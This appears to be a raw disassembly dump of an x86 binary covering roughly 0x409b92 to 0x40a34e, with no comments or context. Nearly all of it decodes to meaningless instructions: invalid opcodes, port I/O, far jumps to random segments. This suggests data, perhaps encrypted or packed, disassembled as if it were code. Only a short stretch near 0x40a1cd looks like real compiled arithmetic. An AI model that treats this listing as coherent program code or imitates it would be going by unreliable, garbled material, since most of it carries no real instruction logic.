  409b92:	xchg   edx,eax
  409b93:	rol    ch,cl
  409b95:	clc    
  409b96:	xor    ecx,DWORD PTR [ebp+0x5f36b1ce]
  409b9c:	(bad)  
  409b9d:	stos   BYTE PTR es:[edi],al
  409b9e:	add    ecx,ebx
  409ba0:	mov    dl,al
  409ba2:	xchg   BYTE PTR [edi-0x69],cl
  409ba5:	and    eax,0xd7ffc5
  409baa:	push   eax
  409bab:	and    DWORD PTR [edx-0x36c356fa],ebp
  409bb1:	in     eax,dx
  409bb2:	das    
  409bb3:	add    al,0x20
  409bb5:	cld    
  409bb6:	cmp    DWORD PTR [edx+0x8],ebp
  409bb9:	add    BYTE PTR [ecx],ch
  409bbb:	mov    ebp,0xed276482
  409bc0:	inc    eax
  409bc1:	adc    al,0xe0
  409bc3:	fs mov cl,0xd5
  409bc6:	pop    es
  409bc7:	aam    0x2b
  409bc9:	imul   BYTE PTR [ebx+0x70]
  409bcc:	push   esi
  409bcd:	dec    ebp
  409bce:	xor    eax,0x886c79fb
  409bd3:	jmp    0x6cb0:0x6a636bab
  409bda:	pop    esp
  409bdb:	cdq    
  409bdc:	aas    
  409bdd:	arpl   WORD PTR [ecx+0x2c58af4],di
  409be3:	push   ebp
  409be4:	inc    ecx
  409be5:	and    eax,0xe5bce2f6
  409bea:	mov    dh,0x96
  409bec:	jnp    0x409b8d
  409bee:	xchg   esi,eax
  409bef:	mov    esp,0xff5ec2f6
  409bf4:	test   DWORD PTR [esi],edx
  409bf6:	call   0x7d47bf2
  409bfb:	jbe    0x409be1
  409bfd:	jp     0x409b9e
  409bff:	xlat   BYTE PTR ds:[ebx]
  409c00:	cmp    BYTE PTR [edx-0x45],bl
  409c03:	or     dh,BYTE PTR [ebx+ecx*4+0x32db1510]
  409c0a:	cs jmp 0x409c4f
  409c0d:	mov    ds:0xa5fd35f4,eax
  409c12:	xlat   BYTE PTR ds:[ebx]
  409c13:	rcl    DWORD PTR [edx],1
  409c15:	dec    edi
  409c16:	dec    esp
  409c17:	pop    DWORD PTR [edx]
  409c19:	cmp    ah,BYTE PTR ss:[edi+0x216bce38]
  409c20:	mov    dh,BYTE PTR [edx+edi*4-0x44aecfc8]
  409c27:	int3   
  409c28:	sub    eax,0xbad3c5ae
  409c2d:	mov    ebx,0xa2e8be7f
  409c32:	push   edx
  409c33:	jns    0x409c09
  409c35:	mov    edx,0x9256d5cf
  409c3a:	sub    ch,BYTE PTR [edi+0x33c733e4]
  409c40:	shr    cl,cl
  409c42:	test   DWORD PTR ds:0xf1ce0000,eax
  409c48:	test   DWORD PTR [ecx+ebp*1+0x6ce82e28],ebp
  409c4f:	dec    eax
  409c50:	push   edx
  409c51:	mov    dl,0xa5
  409c53:	call   DWORD PTR [esi+0x1629026e]
  409c59:	push   ss
  409c5a:	cmp    eax,0x7b161604
  409c5f:	mov    dl,0x4e
  409c61:	ss jecxz 0x409c1f
  409c64:	popf   
  409c65:	xor    eax,0xed984629
  409c6a:	mov    bh,0x5a
  409c6c:	jb     0x409cb2
  409c6e:	outs   dx,DWORD PTR ds:[esi]
  409c6f:	fdiv   st,st(1)
  409c71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c72:	pusha  
  409c73:	and    al,0xc7
  409c75:	and    al,0x94
  409c77:	test   BYTE PTR [esp+ebp*4-0xb],cl
  409c7b:	adc    DWORD PTR [ecx-0x501005f9],ecx
  409c81:	dec    ebp
  409c82:	add    BYTE PTR [esi],ah
  409c84:	ins    DWORD PTR es:[edi],dx
  409c85:	add    dl,BYTE PTR [edx]
  409c87:	js     0x409cd3
  409c89:	or     eax,0xb20bfa1c
  409c8e:	(bad)  
  409c8f:	sbb    DWORD PTR [edi+0x78],ebx
  409c92:	or     BYTE PTR ds:0x16b3188b,al
  409c98:	push   es
  409c99:	repnz mov WORD PTR [esi-0x4b],cs
  409c9d:	xor    cl,BYTE PTR [ecx+0x101508c2]
  409ca3:	pushf  
  409ca4:	dec    ebx
  409ca5:	cdq    
  409ca6:	stos   DWORD PTR es:[edi],eax
  409ca7:	stos   BYTE PTR es:[edi],al
  409ca8:	sbb    DWORD PTR [esi],esi
  409caa:	jnp    0x409c8f
  409cac:	jne    0x409caf
  409cae:	sbb    ch,cl
  409cb0:	rcl    DWORD PTR [ecx-0x21b83222],cl
  409cb6:	sti    
  409cb7:	mov    dh,0xa6
  409cb9:	or     dh,bl
  409cbb:	imul   ecx,DWORD PTR [ebx+0x0],0x52
  409cbf:	fs pop edi
  409cc1:	mov    cl,0xad
  409cc3:	das    
  409cc4:	das    
  409cc5:	or     eax,0x73efc8ad
  409cca:	fld    DWORD PTR [ebp+0x16e81c47]
  409cd0:	in     eax,0x0
  409cd2:	lock dec ebx
  409cd4:	mov    dl,0x30
  409cd6:	std    
  409cd7:	repnz push ebp
  409cd9:	or     eax,0xf607b6d9
  409cde:	push   cs
  409cdf:	and    bh,BYTE PTR [ebp-0x100bb4ed]
  409ce5:	(bad)  
  409ce6:	out    dx,al
  409ce7:	cmp    esp,DWORD PTR [eax-0x6a71d9de]
  409ced:	stos   DWORD PTR es:[edi],eax
  409cee:	push   0xa16050c2
  409cf3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409cf4:	popa   
  409cf5:	push   esi
  409cf6:	leave  
  409cf7:	xor    eax,0x4d2b477a
  409cfc:	jmp    DWORD PTR [ebx-0x34]
  409cff:	lods   al,BYTE PTR ds:[esi]
  409d00:	nop
  409d01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d02:	shl    BYTE PTR [ecx-0x7f],0xb3
  409d06:	and    ebx,eax
  409d08:	xor    DWORD PTR [ebx+ecx*8-0x24],edx
  409d0c:	loop   0x409d30
  409d0e:	loope  0x409d2d
  409d10:	push   0x77
  409d12:	lock dec BYTE PTR [ebx-0x68e2b240]
  409d19:	lahf   
  409d1a:	imul   edx,esp,0xac1beb60
  409d20:	ins    BYTE PTR es:[edi],dx
  409d21:	(bad)  
  409d22:	pop    eax
  409d23:	sub    edx,ecx
  409d25:	cmp    eax,0xb762ffcc
  409d2a:	mov    ebp,0x8525a071
  409d2f:	jb     0x409d4c
  409d31:	add    BYTE PTR [edi-0x37],0xcb
  409d35:	adc    DWORD PTR [ebp+0x6d9f5515],ecx
  409d3b:	je     0x409cd8
  409d3d:	ds add al,0xfc
  409d40:	lahf   
  409d41:	dec    esp
  409d42:	push   eax
  409d43:	lea    esi,[eax]
  409d45:	push   esi
  409d46:	mov    ch,0x21
  409d48:	popa   
  409d49:	iret   
  409d4a:	push   edi
  409d4b:	mov    cl,0xbf
  409d4d:	mov    esi,0xbf1f7e62
  409d52:	js     0x409d20
  409d54:	js     0x409da5
  409d56:	push   ecx
  409d57:	out    dx,al
  409d58:	push   ecx
  409d59:	xor    BYTE PTR [eax],ah
  409d5b:	inc    esp
  409d5c:	inc    edi
  409d5d:	or     DWORD PTR [eax+edx*4+0x45d11bc3],0xeafd64c3
  409d68:	cmp    al,0x17
  409d6a:	xchg   edi,eax
  409d6b:	pop    esp
  409d6c:	(bad)  
  409d6d:	and    ah,BYTE PTR [ecx]
  409d6f:	jle    0x409d59
  409d71:	xor    edx,edx
  409d73:	adc    eax,0x18a08e76
  409d78:	pusha  
  409d79:	arpl   di,dx
  409d7b:	mov    esp,0xb3f8bd58
  409d80:	pop    eax
  409d81:	cmp    DWORD PTR [ebx],eax
  409d83:	nop
  409d84:	cs pop ebp
  409d86:	aas    
  409d87:	popa   
  409d88:	fdiv   st(4),st
  409d8a:	add    DWORD PTR [edi-0x28],edx
  409d8d:	dec    esp
  409d8e:	sub    BYTE PTR [esp+eax*4],0x97
  409d92:	add    DWORD PTR [edx+0x51],0xaa193c38
  409d99:	mov    ebx,0x94edfde8
  409d9e:	aaa    
  409d9f:	pop    eax
  409da0:	xor    edi,DWORD PTR [ebp+0x30]
  409da3:	pop    ds
  409da4:	lea    ebx,[ebx]
  409da6:	sub    al,0xd8
  409da8:	or     eax,0x528f53a8
  409dad:	jno    0x409dd7
  409daf:	mov    WORD PTR [ebp-0x464057ac],ss
  409db5:	call   0x1b46edc
  409dba:	fwait
  409dbb:	std    
  409dbc:	ss pop es
  409dbe:	repz pop edx
  409dc0:	clc    
  409dc1:	mov    edx,ebx
  409dc3:	push   ds
  409dc4:	ror    DWORD PTR [edx+0x7de2561c],1
  409dca:	ror    BYTE PTR [ebx+0x65],1
  409dcd:	adc    eax,0xcaf96a23
  409dd2:	into   
  409dd3:	call   0x61e3:0x11483
  409dda:	ins    DWORD PTR es:[edi],dx
  409ddb:	pusha  
  409ddc:	(bad)  
  409ddd:	addr16 aaa 
  409ddf:	(bad)  
  409de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409de1:	adc    eax,0xf229092b
  409de6:	(bad)  
  409de7:	xchg   esp,eax
  409de8:	xchg   BYTE PTR ds:0xccbfdfaf,bh
  409dee:	int    0x98
  409df0:	mov    ch,0x78
  409df2:	inc    esp
  409df3:	enter  0x8db5,0x2
  409df7:	dec    esi
  409df8:	add    edx,DWORD PTR [ebx-0x77]
  409dfb:	(bad)  
  409dfc:	xchg   esp,eax
  409dfd:	dec    eax
  409dfe:	addr16 mov eax,0xecbb6785
  409e04:	inc    ebx
  409e05:	pop    edx
  409e06:	mov    esp,0x5ffb1fe3
  409e0b:	call   0x5c6e:0x856dd749
  409e12:	into   
  409e13:	adc    al,0x33
  409e15:	jne    0x409da3
  409e17:	sti    
  409e18:	nop
  409e19:	fcmovnu st,st(0)
  409e1b:	and    ebx,edi
  409e1d:	data16 hlt 
  409e1f:	and    dl,BYTE PTR [eax-0x6a7ed942]
  409e25:	je     0x409dde
  409e27:	add    eax,0xadbab9f1
  409e2c:	mov    edx,0xd3fac7b8
  409e31:	mov    al,ds:0x6c44a2df
  409e36:	xor    BYTE PTR ds:0x204082f5,dl
  409e3c:	jne    0x409e57
  409e3e:	hlt    
  409e3f:	sbb    BYTE PTR [esi-0x47],bl
  409e42:	pop    esp
  409e43:	inc    ecx
  409e44:	add    al,0x95
  409e46:	dec    ecx
  409e47:	sahf   
  409e48:	sbb    edi,ebx
  409e4a:	fld    TBYTE PTR [eax-0x5]
  409e4d:	inc    edi
  409e4e:	popa   
  409e4f:	icebp  
  409e50:	sbb    DWORD PTR [ecx+0x4b],ebp
  409e53:	out    0x7,eax
  409e55:	xor    DWORD PTR [eax-0x6b3b8719],ebx
  409e5b:	push   esp
  409e5c:	adc    al,0xcb
  409e5e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e5f:	add    al,0x31
  409e61:	out    dx,al
  409e62:	out    dx,eax
  409e63:	inc    edi
  409e64:	test   eax,0xa5cc2e97
  409e69:	mov    esp,0xcdcdde1a
  409e6e:	fsubr  DWORD PTR [esi-0x31]
  409e71:	mov    ch,0x83
  409e73:	xor    BYTE PTR [ecx+0x49354b2e],ch
  409e79:	test   DWORD PTR [ebx-0x2b],eax
  409e7c:	cmp    al,0x9c
  409e7e:	test   al,0x58
  409e80:	shl    esp,1
  409e82:	mov    al,0xa1
  409e84:	mov    ebx,0x13c6c8d5
  409e89:	jb     0x409e78
  409e8b:	cmp    al,0x4a
  409e8d:	into   
  409e8e:	inc    edi
  409e8f:	int3   
  409e90:	pop    edx
  409e91:	lock mov eax,ds:0xf311c7ad
  409e97:	(bad)  
  409e98:	sbb    ebx,DWORD PTR [edi+0x3f336721]
  409e9e:	int3   
  409e9f:	jg     0x409ed3
  409ea1:	dec    edx
  409ea2:	inc    ebx
  409ea3:	pusha  
  409ea4:	(bad)  
  409ea5:	push   cs
  409ea6:	inc    eax
  409ea7:	inc    ecx
  409ea8:	sub    DWORD PTR [esi+eiz*1+0x1383ad8b],esi
  409eaf:	call   0x9005dcd4
  409eb4:	xchg   DWORD PTR [edi-0x7b60bb16],ecx
  409eba:	scas   al,BYTE PTR es:[edi]
  409ebb:	add    bl,0x1f
  409ebe:	outs   dx,BYTE PTR ds:[esi]
  409ebf:	cld    
  409ec0:	dec    eax
  409ec1:	fwait
  409ec2:	push   0xf8eaae9d
  409ec7:	cmc    
  409ec8:	and    dl,bl
  409eca:	into   
  409ecb:	jle    0x409e5f
  409ecd:	adc    DWORD PTR [ecx+0x5d8f8ad5],ebx
  409ed3:	jns    0x409f4a
  409ed5:	mov    ds,WORD PTR [esi+ebp*1]
  409ed8:	(bad)  
  409ed9:	sbb    dl,dl
  409edb:	xor    edi,DWORD PTR [edi+eax*8]
  409ede:	mov    DWORD PTR [esi],0xe85e43c8
  409ee4:	mov    eax,ds:0x9d826df5
  409ee9:	test   ecx,esp
  409eeb:	adc    esp,edi
  409eed:	into   
  409eee:	sub    cl,dh
  409ef0:	sub    esi,DWORD PTR [esi]
  409ef2:	xor    BYTE PTR [esi+0x67],bl
  409ef5:	sbb    eax,0x6f149c94
  409efa:	mov    WORD PTR [esi+0x7],es
  409efd:	xchg   ecx,eax
  409efe:	add    al,0xd3
  409f00:	push   edx
  409f01:	xchg   cl,ch
  409f03:	xchg   BYTE PTR [ecx+0x10],ch
  409f06:	gs mov ebx,0xbe914f01
  409f0c:	fwait
  409f0d:	sub    BYTE PTR [ebx],bl
  409f0f:	push   edi
  409f10:	sub    ebx,DWORD PTR [ecx]
  409f12:	rcr    DWORD PTR [ecx+0x63190f3c],0x85
  409f19:	lods   eax,DWORD PTR ds:[esi]
  409f1a:	jbe    0xb5ad53e2
  409f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f22:	sbb    DWORD PTR [edi+0x54a67eef],ebx
  409f28:	push   ecx
  409f29:	int    0x76
  409f2b:	jge    0x409efe
  409f2d:	loopne 0x409f12
  409f2f:	std    
  409f30:	jno    0x409f03
  409f32:	or     BYTE PTR [ebp+0x5e],bl
  409f35:	mov    eax,0xbf8c6372
  409f3a:	rol    ebp,cl
  409f3c:	repnz test DWORD PTR [edi+eiz*4+0x4dfbae2c],eax
  409f44:	lods   eax,DWORD PTR ds:[esi]
  409f45:	add    eax,DWORD PTR [eax-0x3f]
  409f48:	sbb    BYTE PTR [ecx-0x5f],al
  409f4b:	dec    esp
  409f4c:	ret    0x818
  409f4f:	jp     0x409eed
  409f51:	outs   dx,BYTE PTR ds:[esi]
  409f52:	and    esp,DWORD PTR [ecx]
  409f54:	cs popf 
  409f56:	(bad)  
  409f57:	int3   
  409f58:	test   eax,0x53318ecd
  409f5d:	rcr    eax,1
  409f5f:	jl     0x409fbc
  409f61:	push   ebx
  409f62:	loope  0x409f74
  409f64:	clc    
  409f65:	aad    0x55
  409f67:	push   ebx
  409f68:	adc    al,0x43
  409f6a:	in     eax,dx
  409f6b:	cdq    
  409f6c:	(bad)  
  409f6d:	gs out 0xc0,eax
  409f70:	lods   al,BYTE PTR ds:[esi]
  409f71:	cmc    
  409f72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f73:	sub    al,0xc9
  409f75:	mov    ebp,0x60cbde19
  409f7a:	pop    esi
  409f7b:	mov    ah,0x87
  409f7d:	shl    BYTE PTR [ebx+0x67],0x52
  409f81:	aaa    
  409f82:	sub    DWORD PTR ds:0x28d2b12f,ebx
  409f88:	ret    0xd772
  409f8b:	jae    0x409fa0
  409f8d:	daa    
  409f8e:	xchg   edi,eax
  409f8f:	xor    BYTE PTR [ebx-0x1ae83c73],ch
  409f95:	inc    esi
  409f96:	loope  0x40a012
  409f98:	jge    0x40a00f
  409f9a:	les    esi,FWORD PTR [ebx-0x3c]
  409f9d:	mov    ds:0x9d74f738,al
  409fa2:	loope  0x409ffb
  409fa4:	xor    DWORD PTR [ebx],ebx
  409fa6:	repnz sub BYTE PTR [ebp+esi*4-0x60],dl
  409fab:	jl     0x409fde
  409fad:	and    BYTE PTR [ecx+0x6177f81a],ch
  409fb3:	outs   dx,DWORD PTR ds:[esi]
  409fb4:	leave  
  409fb5:	sbb    DWORD PTR [ecx-0x74d3678e],edi
  409fbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fbc:	stos   BYTE PTR es:[edi],al
  409fbd:	arpl   WORD PTR [eax+0x1453d562],bx
  409fc3:	push   cs
  409fc4:	cmp    dh,dh
  409fc6:	pop    eax
  409fc7:	jg     0x40a046
  409fc9:	xor    al,bl
  409fcb:	mov    ds,WORD PTR [esi+0x53]
  409fce:	data16 hlt 
  409fd0:	sub    BYTE PTR [edx+ecx*1],cl
  409fd3:	pop    eax
  409fd4:	adc    DWORD PTR [edi],ebp
  409fd6:	lods   al,BYTE PTR ds:[esi]
  409fd7:	add    DWORD PTR [edx-0x48],eax
  409fda:	test   al,bl
  409fdc:	add    ch,BYTE PTR ds:0x49c887b5
  409fe2:	sub    DWORD PTR [ebp+0x4379e9f2],eax
  409fe8:	xchg   esi,eax
  409fe9:	mov    bh,0x67
  409feb:	mov    al,0x15
  409fed:	sbb    cl,BYTE PTR [ebx-0x2be31118]
  409ff3:	xchg   ebp,eax
  409ff4:	push   cs
  409ff5:	inc    edi
  409ff6:	jns    0x40a024
  409ff8:	popf   
  409ff9:	adc    cl,BYTE PTR [ebx]
  409ffb:	int    0x40
  409ffd:	pop    ebx
  409ffe:	jle    0x409fd2
  40a000:	and    DWORD PTR [ebx],eax
  40a002:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a003:	popf   
  40a004:	push   0xffffff88
  40a006:	add    eax,0x20908941
  40a00b:	add    eax,0x2f0a90de
  40a010:	sub    edi,DWORD PTR [eax-0x25]
  40a013:	push   ebx
  40a014:	xchg   ecx,eax
  40a015:	sbb    al,0x15
  40a017:	sub    BYTE PTR [eax+0x3b7a26a8],0x7c
  40a01e:	xor    esi,DWORD PTR [esi-0xe]
  40a021:	push   es
  40a022:	loop   0x40a03d
  40a024:	fnstcw WORD PTR [ebx+0x208652ab]
  40a02a:	test   eax,0xf37f65b4
  40a02f:	test   eax,0x539e87f7
  40a034:	or     BYTE PTR ds:0xbf73b631,dh
  40a03a:	retf   0x819c
  40a03d:	outs   dx,DWORD PTR ds:[esi]
  40a03e:	or     bl,BYTE PTR [ebx+0x43890218]
  40a044:	out    0xd9,al
  40a046:	pop    edx
  40a047:	stc    
  40a048:	push   0x5738145b
  40a04d:	push   ds
  40a04e:	jmp    0x70cca439
  40a053:	sub    ebp,esp
  40a055:	data16 jecxz 0x40a08f
  40a058:	stos   BYTE PTR es:[edi],al
  40a059:	fidivr DWORD PTR [esi]
  40a05b:	ss push ebx
  40a05d:	cmc    
  40a05e:	leave  
  40a05f:	push   edi
  40a060:	pop    edi
  40a061:	xchg   dh,cl
  40a063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a064:	and    DWORD PTR [ecx-0x1e4d6119],0xffffffd8
  40a06b:	in     eax,0xe8
  40a06d:	push   ebp
  40a06e:	and    ebx,DWORD PTR ds:0x21103d7e
  40a074:	pushf  
  40a075:	pop    ebx
  40a076:	dec    ecx
  40a077:	pop    edi
  40a078:	icebp  
  40a079:	push   esi
  40a07a:	mov    BYTE PTR [edi+0x26316646],bh
  40a080:	mov    ebp,0x5c022be
  40a085:	cmp    al,0x2f
  40a087:	int    0xab
  40a089:	mov    ds:0x9d04a3bf,al
  40a08e:	fcmovnbe st,st(6)
  40a090:	aas    
  40a091:	pop    ds
  40a092:	inc    ebp
  40a093:	in     al,0x0
  40a095:	shr    bh,1
  40a097:	div    BYTE PTR [ebp+0x4f]
  40a09a:	int3   
  40a09b:	dec    edi
  40a09c:	adc    eax,0x760d229b
  40a0a1:	sbb    ah,al
  40a0a3:	mov    edx,0x7f97a2f2
  40a0a8:	xor    DWORD PTR [ebp+0xf45dd5e],esi
  40a0ae:	sub    eax,0xa18d34f8
  40a0b3:	xor    ecx,DWORD PTR [edx-0x24]
  40a0b6:	cwde   
  40a0b7:	outs   dx,DWORD PTR ds:[esi]
  40a0b8:	inc    esp
  40a0b9:	sub    BYTE PTR [eax+0x4bbe3872],ch
  40a0bf:	cmp    DWORD PTR [edx-0x443f3fe6],ecx
  40a0c5:	fimul  DWORD PTR [edx+0x5f]
  40a0c8:	addr16 icebp 
  40a0ca:	mov    al,ds:0x4a20a43
  40a0cf:	imul   esp,ebp,0x55
  40a0d2:	hlt    
  40a0d3:	sub    eax,0x46bca700
  40a0d8:	sub    esi,DWORD PTR [ebp+0x72]
  40a0db:	aaa    
  40a0dc:	pop    edi
  40a0dd:	pop    edx
  40a0de:	call   0x14b00192
  40a0e3:	in     al,0x48
  40a0e5:	arpl   WORD PTR [eax+0x3d],cx
  40a0e8:	sub    ah,BYTE PTR [eax+0x20bcb3a9]
  40a0ee:	pop    ds
  40a0ef:	inc    edx
  40a0f0:	and    al,0x6b
  40a0f2:	icebp  
  40a0f3:	dec    esp
  40a0f4:	xchg   esp,ebx
  40a0f6:	daa    
  40a0f7:	mov    ebx,0xdc8b0a9c
  40a0fc:	(bad)  
  40a0fd:	into   
  40a0fe:	stos   BYTE PTR es:[edi],al
  40a0ff:	inc    eax
  40a100:	or     bl,BYTE PTR [esi+0x34]
  40a103:	xchg   bl,ch
  40a105:	nop
  40a106:	cmp    esp,esi
  40a108:	cmp    BYTE PTR [eax+0x2d],cl
  40a10b:	daa    
  40a10c:	sub    DWORD PTR [esi-0x49],0x6473d988
  40a113:	jle    0x40a0d2
  40a115:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a116:	sbb    DWORD PTR [ebx-0x4f],eax
  40a119:	pop    ebp
  40a11a:	and    eax,0xc7177b81
  40a11f:	cmp    dl,BYTE PTR [ebp-0x6f]
  40a122:	mov    ah,0xc0
  40a124:	push   ecx
  40a125:	or     BYTE PTR [ecx-0x403a62ab],0x2b
  40a12c:	dec    ebx
  40a12d:	rol    BYTE PTR [esi+0x77],0x2
  40a131:	pop    ecx
  40a132:	rol    ecx,cl
  40a134:	xchg   edx,eax
  40a135:	imul   esi,esi,0xffffffa6
  40a138:	jg     0x40a13c
  40a13a:	ins    DWORD PTR es:[edi],dx
  40a13b:	pop    ds
  40a13c:	add    eax,0xb0ffcc7d
  40a141:	fcmovbe st,st(1)
  40a143:	into   
  40a144:	mov    DWORD PTR [esi],esi
  40a146:	rol    DWORD PTR [ecx+ebx*1-0x6ac24974],1
  40a14d:	call   0xd6e4:0x505b5163
  40a154:	push   es
  40a155:	out    dx,al
  40a156:	or     DWORD PTR [ebp+0x24],0xc93c719c
  40a15d:	dec    ebp
  40a15e:	gs call 0xde81e3bf
  40a164:	mov    edx,0xd06efb99
  40a169:	push   eax
  40a16a:	dec    esp
  40a16b:	pop    edi
  40a16c:	sub    al,BYTE PTR [ecx-0x77]
  40a16f:	sahf   
  40a170:	mov    ah,0x32
  40a172:	push   edi
  40a173:	das    
  40a174:	mov    al,ds:0x9029a109
  40a179:	aad    0x90
  40a17b:	sti    
  40a17c:	test   eax,0x63a27b23
  40a181:	ret    
  40a182:	mov    ebp,0x34473a1e
  40a187:	imul   ebp,DWORD PTR [esi-0x18],0xbde803c
  40a18e:	add    DWORD PTR [eax-0x16b6ee55],edi
  40a194:	dec    ebp
  40a195:	adc    DWORD PTR [esi+eiz*8-0x46831cd2],esp
  40a19c:	mov    al,ds:0x94ad4ab6
  40a1a1:	aad    0xe6
  40a1a3:	fdivp  st(5),st
  40a1a5:	stos   BYTE PTR es:[edi],al
  40a1a6:	mov    edi,0xa2939082
  40a1ab:	ror    ecx,0x13
  40a1ae:	aaa    
  40a1af:	xor    DWORD PTR [ecx+0x441d7ef3],0xffffff8a
  40a1b6:	or     ebp,eax
  40a1b8:	icebp  
  40a1b9:	xor    eax,ebp
  40a1bb:	shl    DWORD PTR [eax-0x15],1
  40a1be:	mov    ebx,0x4a3160b3
  40a1c3:	aas    
  40a1c4:	shl    BYTE PTR [esi],1
  40a1c6:	fwait
  40a1c7:	sti    
  40a1c8:	mov    bl,BYTE PTR [edx]
  40a1ca:	stos   DWORD PTR es:[edi],eax
  40a1cb:	or     eax,edx
  40a1cd:	mov    cl,BYTE PTR [eax+ecx*1]
  40a1d0:	mov    eax,DWORD PTR [ebp-0x34]
  40a1d3:	or     BYTE PTR [eax],cl
  40a1d5:	mov    eax,DWORD PTR [ebp-0x10]
  40a1d8:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1db:	shrd   eax,ecx,0x2
  40a1df:	shr    ecx,0x2
  40a1e2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a1e5:	mov    edx,DWORD PTR [ebp-0xc]
  40a1e8:	xor    eax,edi
  40a1ea:	shl    ecx,0x1e
  40a1ed:	xor    edx,edx
  40a1ef:	or     eax,edx
  40a1f1:	lea    eax,[ebp+eax*1-0x4]
  40a1f5:	mov    DWORD PTR [ebp-0x34],eax
  40a1f8:	mov    eax,DWORD PTR [ebp-0x10]
  40a1fb:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1fe:	shrd   eax,ecx,0x2
  40a202:	shr    ecx,0x2
  40a205:	jmp    0x40a78f
  40a20a:	sbb    eax,0xb41fb564
  40a20f:	push   ds
  40a210:	sbb    eax,0xfb6fa164
  40a215:	mov    ah,0x92
  40a217:	bound  ecx,QWORD PTR ds:0x161f3974
  40a21d:	push   ss
  40a21e:	cmp    eax,0x43161604
  40a223:	mov    cs,WORD PTR [esp+eiz*8-0x1b]
  40a227:	mov    bh,0x1d
  40a229:	mov    ss,WORD PTR [eax-0x607321bc]
  40a22f:	adc    BYTE PTR [ebp+0x2d],ah
  40a232:	mov    WORD PTR [esi+0x57],gs
  40a235:	repz push esi
  40a237:	push   0xffffffd3
  40a239:	pop    ds
  40a23a:	or     esi,DWORD PTR [edx+0x32]
  40a23d:	nop
  40a23e:	cmp    bh,BYTE PTR [edi-0x65de49b1]
  40a244:	pusha  
  40a245:	clc    
  40a246:	(bad)  
  40a248:	jne    0x40a2b3
  40a24a:	inc    esi
  40a24b:	cmp    BYTE PTR [edi-0x69],al
  40a24e:	sbb    eax,0xb005659a
  40a253:	mov    bl,0x76
  40a255:	(bad)  
  40a256:	inc    eax
  40a257:	pop    ebx
  40a258:	not    DWORD PTR [ebx]
  40a25a:	mov    eax,ds:0x2346cd0e
  40a25f:	out    dx,eax
  40a260:	mov    ecx,0x31d873c8
  40a265:	and    eax,0xea14e514
  40a26a:	data16 scas al,BYTE PTR es:[edi]
  40a26c:	pop    esp
  40a26d:	or     eax,0x9389fdda
  40a272:	mov    esp,0xf67357f0
  40a277:	inc    eax
  40a278:	pop    ds
  40a279:	mov    DWORD PTR [eax+ebp*8],0x569d619a
  40a280:	bound  esp,QWORD PTR [esi]
  40a282:	(bad)  
  40a283:	cwde   
  40a284:	mov    edi,0x509249df
  40a289:	lock stos BYTE PTR es:[edi],al
  40a28b:	xor    BYTE PTR [ecx+ebp*8+0xe54f373],ah
  40a292:	out    dx,eax
  40a293:	icebp  
  40a294:	add    cl,BYTE PTR [ebp-0xb]
  40a297:	add    esi,DWORD PTR [esp+ecx*4-0x4e]
  40a29b:	sbb    esi,edi
  40a29d:	xchg   ebp,eax
  40a29e:	sbb    bh,BYTE PTR [ecx-0x55]
  40a2a1:	loop   0x40a2bb
  40a2a3:	bound  ebp,QWORD PTR [ecx-0x73f45b08]
  40a2a9:	aas    
  40a2aa:	out    dx,al
  40a2ab:	bound  edi,QWORD PTR [edi+0x8757b7c]
  40a2b1:	sbb    dl,bh
  40a2b3:	pushf  
  40a2b4:	ret    0xdab9
  40a2b7:	push   edx
  40a2b8:	and    al,0xbd
  40a2ba:	pop    edx
  40a2bb:	xor    DWORD PTR [ebp-0x630453d2],ecx
  40a2c1:	inc    esi
  40a2c2:	cld    
  40a2c3:	add    bl,al
  40a2c5:	dec    eax
  40a2c6:	add    al,0xb
  40a2c8:	sbb    WORD PTR [edi-0x2c],bp
  40a2cc:	inc    ecx
  40a2cd:	or     bl,BYTE PTR [eax+0x77a6bd74]
  40a2d3:	add    DWORD PTR [ebp-0x6b],edx
  40a2d6:	add    al,0xa1
  40a2d8:	cmc    
  40a2d9:	(bad)  
  40a2da:	lods   al,BYTE PTR ds:[esi]
  40a2db:	xor    BYTE PTR [ebx],0x29
  40a2de:	xor    ax,0xa3fb
  40a2e2:	push   es
  40a2e3:	fstp   TBYTE PTR [esi+ebx*4]
  40a2e6:	dec    ebx
  40a2e7:	jle    0x40a27f
  40a2e9:	sahf   
  40a2ea:	fisttp DWORD PTR [edx]
  40a2ec:	dec    ebp
  40a2ed:	jmp    0x8feaa473
  40a2f2:	retf   0x70bf
  40a2f5:	and    esi,DWORD PTR [ebx]
  40a2f7:	mov    edx,0x362f63e5
  40a2fc:	call   0x8216f6a4
  40a301:	sahf   
  40a302:	jmp    0x521d:0x6206c672
  40a309:	mov    ebx,0x993e03ea
  40a30e:	jecxz  0x40a30c
  40a310:	mov    cl,0x20
  40a312:	(bad)  
  40a313:	in     al,0xa4
  40a315:	jecxz  0x40a323
  40a317:	inc    eax
  40a318:	fcmovu st,st(2)
  40a31a:	mov    bh,0xd7
  40a31c:	mov    edi,0x5e39f955
  40a321:	mov    ds:0x976e39d8,eax
  40a326:	inc    edi
  40a327:	arpl   WORD PTR [edi-0x6f095862],si
  40a32d:	imul   ecx,DWORD PTR [ebx+0x77],0x3a
  40a331:	pop    esi
  40a332:	jecxz  0x40a2e0
  40a334:	and    al,0x56
  40a336:	mov    ch,BYTE PTR [esi]
  40a338:	jb     0x40a2d6
  40a33a:	fisttp QWORD PTR [edx-0x14]
  40a33d:	aad    0xc7
  40a33f:	aad    0x69
  40a341:	mov    al,0x2d
  40a343:	push   es
  40a344:	cmc    
  40a345:	popa   
  40a346:	jo     0x40a37b
  40a348:	adc    DWORD PTR [esi+0x2762b363],ebx
  40a34e:	jmp    0x8a1d:0x7763e3ba
